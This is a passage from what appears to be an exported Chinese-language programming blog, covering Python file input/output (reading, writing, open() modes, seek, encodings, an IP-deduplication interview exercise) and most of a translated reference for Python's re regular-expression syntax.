f.close()</code></pre>\n\n<p>由于文件读写时都有可能产生<code>IOError</code>，一旦出错，后面的<code>f.close()</code>就不会调用。所以，为了保证无论是否出错都能正确地关闭文件，我们可以使用<code>try ... finally</code>来实现：</p>\n\n<p> </p>\n\n<pre>\n<code class=\"language-html hljs\">try:\n    f = open('/path/to/file', 'r')\n    print(f.read())\nfinally:\n    if f:\n        f.close()</code></pre>\n\n<p> </p>\n\n<p>但是每次都这么写实在太繁琐，所以，Python引入了<code>with</code>语句来自动帮我们调用<code>close()</code>方法：</p>\n\n<pre>\n<code class=\"language-html hljs\">with open('/path/to/file', 'r') as f:\n    print(f.read())</code></pre>\n\n<p>python文件对象提供了三个“读”方法： read()、readline() 和 readlines()。每种方法可以接受一个变量以限制每次读取的数据量。</p>\n\n<ul><li>read() 每次读取整个文件，它通常用于将文件内容放到一个字符串变量中。如果文件大于可用内存，为了保险起见，可以反复调用<code>read(size)</code>方法，每次最多读取size个字节的内容。</li>\n\t<li>readlines() 之间的差异是后者一次读取整个文件，象 .read() 一样。.readlines() 自动将文件内容分析成一个行的列表，该列表可以由 Python 的 for ... in ... 结构进行处理。</li>\n\t<li>readline() 每次只读取一行，通常比readlines() 慢得多。仅当没有足够内存可以一次读取整个文件时，才应该使用 readline()。</li>\n</ul><p><strong>注意</strong>：这三种方法是把每行末尾的'\\n'也读进来了，它并不会默认的把'\\n'去掉，需要我们手动去掉。</p>\n\n<pre>\n<code class=\"language-html hljs\">In[2]: with open('test1.txt', 'r') as f1:\n    list1 = f1.readlines()\nIn[3]: list1\nOut[3]: ['111\\n', '222\\n', '333\\n', '444\\n', '555\\n', '666\\n']    </code></pre>\n\n<p>去掉'\\n'</p>\n\n<p> </p>\n\n<pre>\n<code class=\"language-html hljs\">In[4]: with open('test1.txt', 'r') as f1:\n    list1 = f1.readlines()\nfor i in range(0, len(list1)):\n    list1[i] = list1[i].rstrip('\\n')\nIn[5]: list1\nOut[5]: ['111', '222', '333', '444', '555', '666']</code></pre>\n\n<p> </p>\n\n<p>对于read()和readline()也是把'\\n'读入了，但是print的时候可以正常显示（因为print里的'\\n'被认为是换行的意思）</p>\n\n<p> </p>\n\n<pre>\n<code class=\"language-html hljs\">In[7]: with open('test1.txt', 'r') as f1:\n    list1 = f1.read()\nIn[8]: list1\nOut[8]: '111\\n222\\n333\\n444\\n555\\n666\\n'\nIn[9]: print(list1)\n111\n222\n333\n444\n555\n666\n\nIn[10]: with open('test1.txt', 'r') as f1:\n    list1 = f1.readline()\nIn[11]: list1\nOut[11]: '111\\n'\nIn[12]: print(list1)\n111</code></pre>\n\n<p> </p>\n\n<p><strong>一个python面试题的例子：</strong></p>\n\n<p>有两个文件，每个都有很多行ip地址，求出两个文件中相同的ip地址：</p>\n\n<p> </p>\n\n<pre>\n<code class=\"language-html hljs\"># coding:utf-8\nimport bisect\n\nwith open('test1.txt', 'r') as f1:\n    list1 = f1.readlines()\nfor i in range(0, len(list1)):\n    list1[i] = list1[i].strip('\\n')\nwith open('test2.txt', 'r') as f2:\n    list2 = f2.readlines()\nfor i in range(0, len(list2)):\n    list2[i] = list2[i].strip('\\n')\n\nlist2.sort()\nlength_2 = len(list2)\nsame_data = []\nfor i in list1:\n    pos = bisect.bisect_left(list2, i)\n    if pos &lt; len(list2) and list2[pos] == i:\n        same_data.append(i)\nsame_data = list(set(same_data))\nprint(same_data)</code></pre>\n\n<p> </p>\n\n<p>要点就是：（1）用with （2）处理行末的'\\n' （3）使用二分查找提高算法效率。（4）使用set快速去重。</p>\n\n<p> </p>\n\n<h3 id=\"-\">写文件</h3>\n\n<p>写文件和读文件是一样的，唯一区别是调用<code>open()</code>函数时，传入标识符<code>'w'</code>或者<code>'wb'</code>表示写文本文件或写二进制文件：</p>\n\n<pre>\n<code class=\"language-html hljs\">&gt;&gt;&gt; f = open('test.txt', 'w') # 若是'wb'就表示写二进制文件\n&gt;&gt;&gt; f.write('Hello, world!')\n&gt;&gt;&gt; f.close()</code></pre>\n\n<p><strong>注意</strong>：'w'这个模式是酱紫：如果没有这个文件，就创建一个；如果有，那么就会先把原文件的内容清空再写入新的东西。所以若不想清空原来的内容而是直接在后面追加新的内容，就用'a'这个模式。</p>\n\n<p>我们可以反复调用<code>write()</code>来写入文件，但是务必要调用<code>f.close()</code>来关闭文件。当我们写文件时，操作系统往往不会立刻把数据写入磁盘，而是放到内存缓存起来，空闲的时候再慢慢写入。只有调用<code>close()</code>方法时，操作系统才保证把没有写入的数据全部写入磁盘。忘记调用<code>close()</code>的后果是数据可能只写了一部分到磁盘，剩下的丢失了。所以，还是用<code>with</code>语句来得保险：</p>\n\n<pre>\n<code class=\"language-html hljs\">with open('test.txt', 'w') as f:\n    f.write('Hello, world!')</code></pre>\n\n<p>python文件对象提供了两个“写”方法： write() 和 writelines()。</p>\n\n<ul><li>write()方法和read()、readline()方法对应，是将字符串写入到文件中。</li>\n\t<li>writelines()方法和readlines()方法对应，也是针对<strong>列表</strong>的操作。它接收一个<strong>字符串列表</strong>作为参数，将他们写入到文件中，换行符不会自动的加入，因此，需要显式的加入换行符。</li>\n</ul><p> </p>\n\n<pre>\n<code class=\"language-html hljs\">f1 = open('test1.txt', 'w')\nf1.writelines([\"1\", \"2\", \"3\"])\n#    此时test1.txt的内容为:123\n\nf1 = open('test1.txt', 'w')\nf1.writelines([\"1\\n\", \"2\\n\", \"3\\n\"])\n#    此时test1.txt的内容为:\n#    1\n#    2        \n#    3</code></pre>\n\n<p> </p>\n\n<p><strong>关于open()的mode参数</strong>：</p>\n\n<p>'r'：读</p>\n\n<p>'w'：写</p>\n\n<p>'a'：追加</p>\n\n<p>'r+' == r+w（可读可写，文件若不存在就报错(IOError)）</p>\n\n<p>'w+' == w+r（可读可写，文件若不存在就创建）</p>\n\n<p>'a+' ==a+r（可追加可写，文件若不存在就创建）</p>\n\n<p>对应的，如果是二进制文件，就都加一个b就好啦：</p>\n\n<p>'rb'　　'wb'　　'ab'　　'rb+'　　'wb+'　　'ab+'</p>\n\n<p> </p>\n\n<p><strong>file_obj.seek(offset,whence=0)</strong></p>\n\n<p>file_obj.seek(offset,whence=0)方法用来在文件中移动文件指针。offset表示偏移多少。可选参数whence表示从哪里开始偏移，默认是0为文件开头，1为当前位置，2为文件尾部。举例：</p>\n\n<p> </p>\n\n<pre>\n<code class=\"language-html hljs\">f = open(\"test1.txt\", \"a+\")\nprint(f.read())\nf.write('1')\nf.seek(0, 0)# 把文件指针从末尾移到开头，没有这句话下面的read()就读不到正确的东西\nprint(f.read())\nf.close()</code></pre>\n\n<p> </p>\n\n<p><strong>注意</strong>：这个文件指针的改变只是作用于'r',对'w'和'a'不会起作用，如果是'w'，那么write()永远都是从开头写（会覆盖后面对应位置的内容），是'a'的话write()就永远都是从最后开始追加。</p>\n\n<h3>字符编码</h3>\n\n<p>要读取非UTF-8编码的文本文件，需要给<code>open()</code>函数传入<code>encoding</code>参数，例如，读取GBK编码的文件：</p>\n\n<pre>\n<code class=\"language-html hljs\">&gt;&gt;&gt; f = open('test.txt', 'r', encoding='gbk')\n&gt;&gt;&gt; f.read()\n'测试'</code></pre>\n\n<p>遇到有些编码不规范的文件，你可能会遇到<code>UnicodeDecodeError</code>，因为在文本文件中可能夹杂了一些非法编码的字符。遇到这种情况，<code>open()</code>函数还接收一个<code>errors</code>参数，表示如果遇到编码错误后如何处理。最简单的方式是直接忽略：</p>\n\n<pre>\n<code class=\"language-html hljs\">&gt;&gt;&gt; f = open('test.txt', 'r', encoding='gbk', errors='ignore')</code></pre>\n                                    </div>", "log_PostTime": 1584891093, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python的re模块 --- 正则表达式操作", "log_Intro": "Python的re模块 --- 正则表达式操作", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>这个模块提供了与 Perl 语言类似的正则表达式匹配操作。</p>\n\n<p>模式和被搜索的字符串既可以是 Unicode 字符串 (<a href=\"https://docs.python.org/zh-cn/3.7/library/stdtypes.html#str\" rel=\"nofollow\"><code>str</code></a>) ，也可以是8位字节串 (<a href=\"https://docs.python.org/zh-cn/3.7/library/stdtypes.html#bytes\" rel=\"nofollow\"><code>bytes</code></a>)。 但是，Unicode 字符串与8位字节串不能混用：也就是说，你不能用一个字节串模式去匹配 Unicode 字符串，反之亦然；类似地，当进行替换操作时，替换字符串的类型也必须与所用的模式和搜索字符串的类型一致。</p>\n\n<p>正则表达式使用反斜杠（<code>'\\'</code>）来表示特殊形式，或者把特殊字符转义成普通字符。 而反斜杠在普通的 Python 字符串里也有相同的作用，所以就产生了冲突。比如说，要匹配一个字面上的反斜杠，正则表达式模式不得不写成 <code>'\\\\\\\\'</code>，因为正则表达式里匹配一个反斜杠必须是 <code>\\\\</code> ，而每个反斜杠在普通的 Python 字符串里都要写成 <code>\\\\</code> 。</p>\n\n<p>解决办法是对于正则表达式样式使用 Python 的原始字符串表示法；在带有 <code>'r'</code> 前缀的字符串字面值中，反斜杠不必做任何特殊处理。 因此 <code>r\"\\n\"</code> 表示包含 <code>'\\'</code> 和 <code>'n'</code> 两个字符的字符串，而 <code>\"\\n\"</code> 则表示只包含一个换行符的字符串。 样式在 Python 代码中通常都会使用这种原始字符串表示法来表示。</p>\n\n<p>绝大部分正则表达式操作都提供为模块函数和方法，在 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re-objects\" rel=\"nofollow\">编译正则表达式</a>. 这些函数是一个捷径，不需要先编译一个正则对象，但是损失了一些优化参数。</p>\n\n<p>参见</p>\n\n<p> </p>\n\n<p>第三方模块 <a href=\"https://pypi.org/project/regex/\" rel=\"nofollow\">regex</a> , 提供了与标准库 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#module-re\" rel=\"nofollow\"><code>re</code></a> 模块兼容的API接口, 同时还提供了额外的功能和更全面的Unicode支持。</p>\n\n<h2>正则表达式语法</h2>\n\n<p>一个正则表达式（或RE）指定了一集与之匹配的字符串；模块内的函数可以让你检查某个字符串是否跟给定的正则表达式匹配（或者一个正则表达式是否匹配到一个字符串，这两种说法含义相同）。</p>\n\n<p>正则表达式可以拼接； 如果 <em>A</em> 和 <em>B</em> 都是正则表达式， 那么 <em>AB</em> 也是正则表达式。 通常， 如果字符串 <em>p</em> 匹配 <em>A</em> 并且另一个字符串 <em>q</em> 匹配 <em>B</em>, 那么 <em>pq</em> 可以匹配 AB。除非 <em>A</em> 或者 <em>B</em> 包含低优先级操作，<em>A</em> 和 <em>B</em> 存在边界条件；或者命名组引用。所以，复杂表达式可以很容易的从这里描述的简单源语表达式构建。 了解更多正则表达式理论和实现，参考the Friedl book <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#frie09\" rel=\"nofollow\" id=\"id1\">[Frie09]</a> ，或者其他编译器构建的书籍。</p>\n\n<p>以下是正则表达式格式的简要说明。更详细的信息和演示，参考 <a href=\"https://docs.python.org/zh-cn/3.7/howto/regex.html#regex-howto\" rel=\"nofollow\">正则表达式HOWTO</a>。</p>\n\n<p>正则表达式可以包含普通或者特殊字符。绝大部分普通字符，比如 <code>'A'</code>, <code>'a'</code>, 或者 <code>'0'</code>，都是最简单的正则表达式。它们就匹配自身。你可以拼接普通字符，所以 <code>last</code> 匹配字符串 <code>'last'</code>. （在这一节的其他部分，我们将用 <code>this special style</code> 这种方式表示正则表达式，通常不带引号，要匹配的字符串用 <code>'in single quotes'</code> ，单引号形式。）</p>\n\n<p>有些字符，比如 <code>'|'</code> 或者 <code>'('</code>，属于特殊字符。 特殊字符既可以表示它的普通含义， 也可以影响它旁边的正则表达式的解释。</p>\n\n<p>重复修饰符 (<code>*</code>, <code>+</code>, <code>?</code>, <code>{m,n}</code>, 等) 不能直接嵌套。这样避免了非贪婪后缀 <code>?</code> 修饰符，和其他实现中的修饰符产生的多义性。要应用一个内层重复嵌套，可以使用括号。 比如，表达式 <code>(?:a{6})*</code> 匹配6个 <code>'a'</code> 字符重复任意次数。</p>\n\n<p>特殊字符是：</p>\n\n<p><code>.</code></p>\n\n<p>(点) 在默认模式，匹配除了换行的任意字符。如果指定了标签 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.DOTALL\" rel=\"nofollow\"><code>DOTALL</code></a> ，它将匹配包括换行符的任意字符。</p>\n\n<p><code>^</code></p>\n\n<p>(插入符号) 匹配字符串的开头， 并且在 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.MULTILINE\" rel=\"nofollow\"><code>MULTILINE</code></a> 模式也匹配换行后的首个符号。</p>\n\n<p><code>$</code></p>\n\n<p>匹配字符串尾或者换行符的前一个字符，在 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.MULTILINE\" rel=\"nofollow\"><code>MULTILINE</code></a> 模式匹配换行符的前一个字符。 <code>foo</code> 匹配 <code>'foo'</code> 和 <code>'foobar'</code> , 但正则 <code>foo$</code> 只匹配 <code>'foo'</code>。更有趣的是， 在 <code>'foo1\\nfoo2\\n'</code> 搜索 <code>foo.$</code> ，通常匹配 <code>'foo2'</code> ，但在 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.MULTILINE\" rel=\"nofollow\"><code>MULTILINE</code></a> 模式 ，可以匹配到 <code>'foo1'</code> ；在 <code>'foo\\n'</code> 搜索 <code>$</code> 会找到两个空串：一个在换行前，一个在字符串最后。</p>\n\n<p><code>*</code></p>\n\n<p>对它前面的正则式匹配0到任意次重复， 尽量多的匹配字符串。 <code>ab*</code> 会匹配 <code>'a'</code>， <code>'ab'</code>， 或者 <code>'a'``后面跟随任意个 ``'b'</code>。</p>\n\n<p><code>+</code></p>\n\n<p>对它前面的正则式匹配1到任意次重复。 <code>ab+</code> 会匹配 <code>'a'</code> 后面跟随1个以上到任意个 <code>'b'</code>，它不会匹配 <code>'a'</code>。</p>\n\n<p><code>?</code></p>\n\n<p>对它前面的正则式匹配0到1次重复。 <code>ab?</code> 会匹配 <code>'a'</code> 或者 <code>'ab'</code>。</p>\n\n<p><code>*?</code>, <code>+?</code>, <code>??</code></p>\n\n<p><code>'*'</code>, <code>'+'</code>，和 <code>'?'</code> 修饰符都是 <em>贪婪的</em>；它们在字符串进行尽可能多的匹配。有时候并不需要这种行为。如果正则式 <code>&lt;.*&gt;</code> 希望找到 <code>'&lt;a&gt; b &lt;c&gt;'</code>，它将会匹配整个字符串，而不仅是 <code>'&lt;a&gt;'</code>。在修饰符之后添加 <code>?</code> 将使样式以 <em>非贪婪`方式或者 :dfn:`最小</em> 方式进行匹配； 尽量 <em>少</em> 的字符将会被匹配。 使用正则式 <code>&lt;.*?&gt;</code> 将会仅仅匹配 <code>'&lt;a&gt;'</code>。</p>\n\n<p>\"{m}\"</p>\n\n<p>对其之前的正则式指定匹配 <em>m</em> 个重复；少于 <em>m</em> 的话就会导致匹配失败。比如， <code>a{6}</code> 将匹配6个 <code>'a'</code> , 但是不能是5个。</p>\n\n<p>\"{m, n}\"</p>\n\n<p>对正则式进行 <em>m</em> 到 <em>n</em> 次匹配，在 <em>m</em> 和 <em>n</em> 之间取尽量多。 比如，<code>a{3,5}</code> 将匹配 3 到 5个 <code>'a'</code>。忽略 <em>m</em> 意为指定下界为0，忽略 <em>n</em> 指定上界为无限次。 比如 <code>a{4,}b</code> 将匹配 <code>'aaaab'</code> 或者1000个 <code>'a'</code> 尾随一个 <code>'b'</code>，但不能匹配 <code>'aaab'</code>。逗号不能省略，否则无法辨别修饰符应该忽略哪个边界。</p>\n\n<p><code>{m,n}?</code></p>\n\n<p>前一个修饰符的非贪婪模式，只匹配尽量少的字符次数。比如，对于 <code>'aaaaaa'</code>， <code>a{3,5}</code> 匹配 5个 <code>'a'</code> ，而 <code>a{3,5}?</code> 只匹配3个 <code>'a'</code>。</p>\n\n<p><code>\\</code></p>\n\n<p>转义特殊字符（允许你匹配 <code>'*'</code>, <code>'?'</code>, 或者此类其他），或者表示一个特殊序列；特殊序列之后进行讨论。</p>\n\n<p>如果你没有使用原始字符串（ <code>r'raw'</code> ）来表达样式，要牢记Python也使用反斜杠作为转义序列；如果转义序列不被Python的分析器识别，反斜杠和字符才能出现在字符串中。如果Python可以识别这个序列，那么反斜杠就应该重复两次。这将导致理解障碍，所以高度推荐，就算是最简单的表达式，也要使用原始字符串。</p>\n\n<p><code>[]</code></p>\n\n<p>用于表示一个字符集合。在一个集合中：</p>\n\n<ul><li>字符可以单独列出，比如 <code>[amk]</code> 匹配 <code>'a'</code>， <code>'m'</code>， 或者 <code>'k'</code>。</li>\n</ul><ul id=\"index-10\"><li>可以表示字符范围，通过用 <code>'-'</code> 将两个字符连起来。比如 <code>[a-z]</code> 将匹配任何小写ASCII字符， <code>[0-5][0-9]</code> 将匹配从 <code>00</code> 到 <code>59</code> 的两位数字， <code>[0-9A-Fa-f]</code> 将匹配任何十六进制数位。 如果 <code>-</code> 进行了转义 （比如 <code>[a\\-z]</code>）或者它的位置在首位或者末尾（如 <code>[-a]</code> 或 <code>[a-]</code>），它就只表示普通字符 <code>'-'</code>。</li>\n\t<li>特殊字符在集合中，失去它的特殊含义。比如 <code>[(+*)]</code> 只会匹配这几个文法字符 <code>'('</code>, <code>'+'</code>, <code>'*'</code>, or <code>')'</code>。</li>\n</ul><ul id=\"index-11\"><li>字符类如 <code>\\w</code> 或者 <code>\\S</code> (如下定义) 在集合内可以接受，它们可以匹配的字符由 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.ASCII\" rel=\"nofollow\"><code>ASCII</code></a> 或者 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.LOCALE\" rel=\"nofollow\"><code>LOCALE</code></a> 模式决定。</li>\n</ul><ul id=\"index-12\"><li>不在集合范围内的字符可以通过 <em>取反</em> 来进行匹配。如果集合首字符是 <code>'^'</code> ，所有 <em>不</em> 在集合内的字符将会被匹配，比如 <code>[^5]</code> 将匹配所有字符，除了 <code>'5'</code>， <code>[^^]</code> 将匹配所有字符，除了 <code>'^'</code>. <code>^</code> 如果不在集合首位，就没有特殊含义。</li>\n\t<li>在集合内要匹配一个字符 <code>']'</code>，有两种方法，要么就在它之前加上反斜杠，要么就把它放到集合首位。比如， <code>[()[\\]{}]</code> 和 <code>[]()[{}]</code> 都可以匹配括号。</li>\n</ul><ul><li><a href=\"https://unicode.org/reports/tr18/\" rel=\"nofollow\">Unicode Technical Standard #18</a> 里的嵌套集合和集合操作支持可能在未来添加。这将会改变语法，所以为了帮助这个改变，一个 <a href=\"https://docs.python.org/zh-cn/3.7/library/exceptions.html#FutureWarning\" rel=\"nofollow\"><code>FutureWarning</code></a> 将会在有多义的情况里被 <code>raise</code>，包含以下几种情况，集合由 <code>'['</code> 开始，或者包含下列字符序列 <code>'--'</code>, <code>'&amp;&amp;'</code>, <code>'~~'</code>, 和 <code>'||'</code>。为了避免警告，需要将它们用反斜杠转义。</li>\n</ul><p>在 3.7 版更改: 如果一个字符串构建的语义在未来会改变的话，一个 <a href=\"https://docs.python.org/zh-cn/3.7/library/exceptions.html#FutureWarning\" rel=\"nofollow\"><code>FutureWarning</code></a> 会 <code>raise</code> 。</p>\n\n<p><code>|</code></p>\n\n<p><code>A|B</code>， <em>A</em> 和 <em>B</em> 可以是任意正则表达式，创建一个正则表达式，匹配 <em>A</em> 或者 <em>B</em>. 任意个正则表达式可以用 <code>'|'</code> 连接。它也可以在组合（见下列）内使用。扫描目标字符串时， <code>'|'</code> 分隔开的正则样式从左到右进行匹配。当一个样式完全匹配时，这个分支就被接受。意思就是，一旦 <em>A</em> 匹配成功， <em>B</em> 就不再进行匹配，即便它能产生一个更好的匹配。或者说，<code>'|'</code> 操作符绝不贪婪。 如果要匹配 <code>'|'</code> 字符，使用 <code>\\|</code>， 或者把它包含在字符集里，比如 <code>[|]</code>.</p>\n\n<p><code>(...)</code></p>\n\n<p>（组合），匹配括号内的任意正则表达式，并标识出组合的开始和结尾。匹配完成后，组合的内容可以被获取，并可以在之后用 <code>\\number</code> 转义序列进行再次匹配，之后进行详细说明。要匹配字符 <code>'('</code> 或者 <code>')'</code>, 用 <code>\\(</code>或 <code>\\)</code>, 或者把它们包含在字符集合里: <code>[(]</code>, <code>[)]</code>.</p>\n\n<p><code>(?…)</code></p>\n\n<p>这是个扩展标记法 （一个 <code>'?'</code> 跟随 <code>'('</code> 并无含义）。 <code>'?'</code> 后面的第一个字符决定了这个构建采用什么样的语法。这种扩展通常并不创建新的组合； <code>(?P&lt;name&gt;...)</code> 是唯一的例外。 以下是目前支持的扩展。</p>\n\n<p><code>(?aiLmsux)</code></p>\n\n<p>( <code>'a'</code>, <code>'i'</code>, <code>'L'</code>, <code>'m'</code>, <code>'s'</code>, <code>'u'</code>, <code>'x'</code> 中的一个或多个) 这个组合匹配一个空字符串；这些字符对正则表达式设置以下标记 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.A\" rel=\"nofollow\"><code>re.A</code></a> (只匹配ASCII字符), <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.I\" rel=\"nofollow\"><code>re.I</code></a> (忽略大小写), <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.L\" rel=\"nofollow\"><code>re.L</code></a> (语言依赖), <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.M\" rel=\"nofollow\"><code>re.M</code></a> (多行模式), <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.S\" rel=\"nofollow\"><code>re.S</code></a> (点dot匹配全部字符), <code>re.U</code> (Unicode匹配), and <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.X\" rel=\"nofollow\"><code>re.X</code></a> (冗长模式)。 (这些标记在 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#contents-of-module-re\" rel=\"nofollow\">模块内容</a> 中描述) 如果你想将这些标记包含在正则表达式中，这个方法就很有用，免去了在 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.compile\" rel=\"nofollow\"><code>re.compile()</code></a> 中传递 <em>flag</em> 参数。标记应该在表达式字符串首位表示。</p>\n\n<p><code>(?:…)</code></p>\n\n<p>正则括号的非捕获版本。 匹配在括号内的任何正则表达式，但该分组所匹配的子字符串 <em>不能</em> 在执行匹配后被获取或是之后在模式中被引用。</p>\n\n<p><code>(?aiLmsux-imsx:…)</code></p>\n\n<p>(<code>'a'</code>, <code>'i'</code>, <code>'L'</code>, <code>'m'</code>, <code>'s'</code>, <code>'u'</code>, <code>'x'</code> 中的0或者多个， 之后可选跟随 <code>'-'</code> 在后面跟随 <code>'i'</code> , <code>'m'</code> , <code>'s'</code> , <code>'x'</code> 中的一到多个 .) 这些字符为表达式的其中一部分 <em>设置</em> 或者 <em>去除</em> 相应标记 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.A\" rel=\"nofollow\"><code>re.A</code></a> (只匹配ASCII), <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.I\" rel=\"nofollow\"><code>re.I</code></a> (忽略大小写), <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.L\" rel=\"nofollow\"><code>re.L</code></a> (语言依赖), <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.M\" rel=\"nofollow\"><code>re.M</code></a> (多行), <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.S\" rel=\"nofollow\"><code>re.S</code></a> (点匹配所有字符), <code>re.U</code> (Unicode匹配), and <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.X\" rel=\"nofollow\"><code>re.X</code></a> (冗长模式)。(标记描述在 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#contents-of-module-re\" rel=\"nofollow\">模块内容</a> .)</p>\n\n<p><code>'a'</code>, <code>'L'</code> and <code>'u'</code> 作为内联标记是相互排斥的， 所以它们不能结合在一起，或者跟随 <code>'-'</code> 。 当他们中的某个出现在内联组中，它就覆盖了括号组内的匹配模式。在Unicode样式中， <code>(?a:...)</code> 切换为 只匹配ASCII， <code>(?u:...)</code> 切换为Unicode匹配 (默认). 在byte样式中 <code>(?L:...)</code> 切换为语言依赖模式， <code>(?a:...)</code> 切换为 只匹配ASCII (默认)。这种方式只覆盖组合内匹配，括号外的匹配模式不受影响。</p>\n\n<p>3.6 新版功能.</p>\n\n<p>在 3.7 版更改: 符号 <code>'a'</code>, <code>'L'</code> 和 <code>'u'</code> 同样可以用在一个组合内。</p>\n\n<p><code>(?P&lt;name&gt;…)</code></p>\n\n<p>（命名组合）类似正则组合，但是匹配到的子串组在外部是通过定义的 <em>name</em> 来获取的。组合名必须是有效的Python标识符，并且每个组合名只能用一个正则表达式定义，只能定义一次。一个符号组合同样是一个数字组合，就像这个组合没有被命名一样。</p>\n\n<p>命名组合可以在三种上下文中引用。如果样式是 <code>(?P&lt;quote&gt;['\"]).*?(?P=quote)</code> （也就是说，匹配单引号或者双引号括起来的字符串)：</p>\n\n<table border=\"1\"><thead><tr><th>引用组合 \"quote\" 的上下文</th>\n\t\t\t<th>引用方法</th>\n\t\t</tr></thead><tbody><tr><td>在正则式自身内</td>\n\t\t\t<td>\n\t\t\t<ul><li><code>(?P=quote)</code> (如示)</li>\n\t\t\t\t<li><code>\\1</code></li>\n\t\t\t</ul></td>\n\t\t</tr><tr><td>处理匹配对象 <em>m</em></td>\n\t\t\t<td>\n\t\t\t<ul><li><code>m.group('quote')</code></li>\n\t\t\t\t<li><code>m.end('quote')</code> (等)</li>\n\t\t\t</ul></td>\n\t\t</tr><tr><td>传递到 <code>re.sub()</code> 里的 <em>repl</em> 参数中</td>\n\t\t\t<td>\n\t\t\t<ul><li><code>\\g&lt;quote&gt;</code></li>\n\t\t\t\t<li><code>\\g&lt;1&gt;</code></li>\n\t\t\t\t<li><code>\\1</code></li>\n\t\t\t</ul></td>\n\t\t</tr></tbody></table><p><code>(?P=name)</code></p>\n\n<p>反向引用一个命名组合；它匹配前面那个叫 <em>name</em> 的命名组中匹配到的串同样的字串。</p>\n\n<p><code>(?#…)</code></p>\n\n<p>注释；里面的内容会被忽略。</p>\n\n<p><code>(?=…)</code></p>\n\n<p>匹配 <code>…</code> 的内容，但是并不消费样式的内容。这个叫做 <em>lookahead assertion</em>。比如， <code>Isaac (?=Asimov)</code> 匹配 <code>'Isaac '</code> 只有在后面是 <code>'Asimov'</code> 的时候。</p>\n\n<p><code>(?!…)</code></p>\n\n<p>匹配 <code>…</code> 不符合的情况。这个叫 <em>negative lookahead assertion</em> （前视取反）。比如说， <code>Isaac (?!Asimov)</code> 只有后面 <em>不</em> 是 <code>'Asimov'</code> 的时候才匹配 <code>'Isaac '</code> 。</p>\n\n<p><code>(?&lt;=…)</code></p>\n\n<p>匹配字符串的当前位置，它的前面匹配 <code>…</code> 的内容到当前位置。这叫:dfn:positive lookbehind assertion （正向后视断定）。 <code>(?&lt;=abc)def</code> 会在 <code>'abcdef'</code> 中找到一个匹配，因为后视会往后看3个字符并检查是否包含匹配的样式。包含的匹配样式必须是定长的，意思就是 <code>abc</code> 或 <code>a|b</code> 是允许的，但是 <code>a*</code> 和 <code>a{3,4}</code> 不可以。注意以 positive lookbehind assertions 开始的样式，如 <code>(?&lt;=abc)def</code> ，并不是从 a 开始搜索，而是从 d 往回看的。你可能更加愿意使用 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.search\" rel=\"nofollow\"><code>search()</code></a> 函数，而不是 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.match\" rel=\"nofollow\"><code>match()</code></a> 函数：</p>\n\n<pre>\n&gt;&gt;&gt; import re\n&gt;&gt;&gt; m = re.search('(?&lt;=abc)def', 'abcdef')\n&gt;&gt;&gt; m.group(0)\n'def'\n</pre>\n\n<p>这个例子搜索一个跟随在连字符后的单词：</p>\n\n<pre>\n&gt;&gt;&gt; m = re.search(r'(?&lt;=-)\\w+', 'spam-egg')\n&gt;&gt;&gt; m.group(0)\n'egg'\n</pre>\n\n<p>在 3.5 版更改: 添加定长组合引用的支持。</p>\n\n<p><code>(?&lt;!…)</code></p>\n\n<p>匹配当前位置之前不是 <code>…</code> 的样式。这个叫:dfn:negative lookbehind assertion （后视断定取非）。类似正向后视断定，包含的样式匹配必须是定长的。由 negative lookbehind assertion 开始的样式可以从字符串搜索开始的位置进行匹配。</p>\n\n<p><code>(?(id/name)yes-pattern|no-pattern)</code></p>\n\n<p>如果给定的 <em>id</em> 或 <em>name</em> 存在，将会尝试匹配 <code>yes-pattern</code> ，否则就尝试匹配 <code>no-pattern</code>，<code>no-pattern</code> 可选，也可以被忽略。比如， <code>(&lt;)?(\\w+@\\w+(?:\\.\\w+)+)(?(1)&gt;|$)</code> 是一个email样式匹配，将匹配 <code>'&lt;user@host.com&gt;'</code> 或 <code>'user@host.com'</code> ，但不会匹配 <code>'&lt;user@host.com'</code> ，也不会匹配 <code>'user@host.com&gt;'</code>。</p>\n\n<p>由 <code>'\\'</code> 和一个字符组成的特殊序列在以下列出。 如果普通字符不是ASCII数位或者ASCII字母，那么正则样式将匹配第二个字符。比如，<code>\\$</code> 匹配字符 <code>'$'</code>.</p>\n\n<p><code>\\number</code></p>\n\n<p>匹配数字代表的组合。每个括号是一个组合，组合从1开始编号。比如 <code>(.+) \\1</code> 匹配 <code>'the the'</code> 或者 <code>'55 55'</code>, 但不会匹配 <code>'thethe'</code> (注意组合后面的空格)。这个特殊序列只能用于匹配前面99个组合。如果 <em>number</em> 的第一个数位是0， 或者 <em>number</em> 是三个八进制数，它将不会被看作是一个组合，而是八进制的数字值。在 <code>'['</code> 和 <code>']'</code> 